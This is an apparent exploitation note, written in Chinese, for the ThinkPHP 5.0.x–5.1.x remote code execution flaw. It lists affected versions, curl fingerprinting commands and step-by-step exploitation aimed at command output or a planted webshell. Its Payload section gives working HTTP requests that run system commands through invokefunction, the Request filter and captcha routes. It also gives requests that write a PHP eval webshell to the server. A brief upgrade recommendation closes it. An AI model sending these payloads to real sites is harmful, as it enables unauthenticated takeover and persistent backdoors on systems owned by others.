## 漏洞描述

ThinkPHP 5.0.x-5.0.23 和 5.1.x-5.1.30 版本中，框架对控制器名未进行充分过滤，攻击者可以通过构造特殊 URL 调用任意方法执行系统命令。

## 影响版本

- ThinkPHP 5.0.0 - 5.0.23
- ThinkPHP 5.1.0 - 5.1.30

## 前置条件

- 无需认证
- 目标未开启强制路由（默认配置）

## 利用步骤

1. 确认目标使用ThinkPHP 5.x框架（通过404页面或错误信息）
2. 选择合适的RCE payload（根据版本5.0.x或5.1.x）
3. 发送构造的请求触发命令执行
4. 获取命令回显或写入webshell

## 指纹确认

```bash
# ThinkPHP 特征
curl -s http://target/ | grep -i "thinkphp\|V5\.\|10年磨一剑"
# 404 页面特征
curl -s http://target/xxxnotexist | grep -i "thinkphp"
# 默认错误页面
curl -s "http://target/?s=captcha" 
```

## Payload

```http
# ThinkPHP 5.0.x RCE (method 1)
GET /?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami HTTP/1.1

# ThinkPHP 5.0.x RCE (method 2)
POST /index.php?s=captcha HTTP/1.1
Content-Type: application/x-www-form-urlencoded

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id

# ThinkPHP 5.1.x RCE
GET /?s=index/\think\Request/input&filter[]=system&data=id HTTP/1.1

# ThinkPHP 5.0.x 写 webshell
GET /?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php eval($_POST[cmd]);?> HTTP/1.1

# 更多 5.0.x payload 变体
/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```

## 验证方法

发送 payload 观察是否返回命令执行结果（如 whoami 输出）。

## 修复建议

1. 升级 ThinkPHP 至 5.0.24+ 或 5.1.31+
2. 使用路由白名单限制控制器访问
